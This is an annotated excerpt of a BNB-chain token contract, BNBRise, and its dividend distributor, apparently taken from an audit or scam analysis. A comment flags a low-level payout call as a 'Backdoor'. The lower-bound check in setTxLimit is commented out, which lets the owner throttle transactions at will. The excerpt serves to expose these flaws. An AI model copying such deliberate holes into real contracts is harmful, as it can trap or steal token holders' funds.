...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public minDistribution = 1 * (10**16); // 0.01 BNB minimum auto send
    uint256 public minimumTokenBalanceForDividends = 7130000 * (10**9); // user must hold 7130000 token
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if (amount > 0) {
            ...
            // NOTE: Backdoor
            shareholder.call{value: amount, gas: 3000}("");
...
contract BNBRise is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    uint256 _totalSupply = 713000000000 * (10**_decimals);
    ...
    uint256 public _maxTxAmount = _totalSupply.mul(5).div(100); // Max tx %5
    ...
    function setTxLimit(uint256 amount) external onlyOwner {/*
        require amount >= totalSupply.div(100)*1 // Can not set lower than %1
        */
        _maxTxAmount = amount; 
    }
